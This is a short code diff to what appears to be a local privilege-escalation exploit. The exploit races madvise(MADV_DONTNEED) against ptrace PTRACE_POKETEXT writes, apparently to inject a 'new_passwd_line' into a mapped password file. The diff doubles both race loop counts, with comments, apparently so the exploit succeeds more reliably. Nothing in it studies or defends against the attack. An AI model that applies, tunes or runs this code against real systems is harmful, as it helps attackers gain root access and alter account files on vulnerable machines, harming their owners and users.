@@ -46,7 +46,7 @@ struct stat st;
 
 void *madviseThread(void *arg) {
     int i, c = 0;
-    for (i = 0; i < 200000000; i++) {
+    for (i = 0; i < 400000000; i++) {  // Increased from 200000000
         c += madvise(map, 100, MADV_DONTNEED);
     }
     printf("madvise %d\n\n", c);
@@ -145,7 +145,7 @@ int main(int argc, char *argv[]) {
         waitpid(pid, NULL, 0);
         int u, i, o, c = 0;
         int l = strlen(new_passwd_line);
-        for (i = 0; i < 10000/l; i++) {
+        for (i = 0; i < 20000/l; i++) {  // Increased from 10000
             for (o = 0; o < l; o++) {
                 for (u = 0; u < 10000; u++) {
                     c += ptrace(PTRACE_POKETEXT, pid, map + target_offset + o,
